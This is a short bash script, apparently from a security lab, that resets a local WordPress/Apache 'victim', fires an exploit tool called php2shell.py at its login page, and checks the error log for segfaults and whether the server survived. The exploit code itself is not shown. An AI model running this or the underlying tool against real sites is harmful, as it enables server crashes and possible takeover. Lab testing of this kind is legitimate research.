#!/bin/bash
# Final jammy uprog run: clean victim, fire, capture kill + error-log segfault,
# all in ONE session (apache -X dies with the session otherwise).
set -u
PORT=8080
# kill any stale lab server by exact port (playbook item 2)
for pid in $(pgrep -f "127.0.0.1:$PORT"); do kill "$pid" 2>/dev/null; done
sleep 1
bash /mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/lab/setup_wp_jammy.sh 2>&1 | tail -4
for i in $(seq 1 20); do
  curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$PORT/" && break
  sleep 1
done
curl -s -o /dev/null -w "victim: %{http_code}\n" --max-time 3 "http://127.0.0.1:$PORT/"
python3 /mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/php2shell.py \
  --target "http://127.0.0.1:$PORT" --chain uprog \
  --endpoint /wp-login.php --rounds 40 2>&1 | grep -vE "^\[?\*" | tail -10
echo "--- error log (segfault receipts):"
grep -iE 'segfault|signal' /tmp/v_wp/error.log | tail -3
echo "--- post-fire health:"
curl -s -o /dev/null -w "victim: %{http_code}\n" --max-time 3 "http://127.0.0.1:$PORT/" || echo DEAD
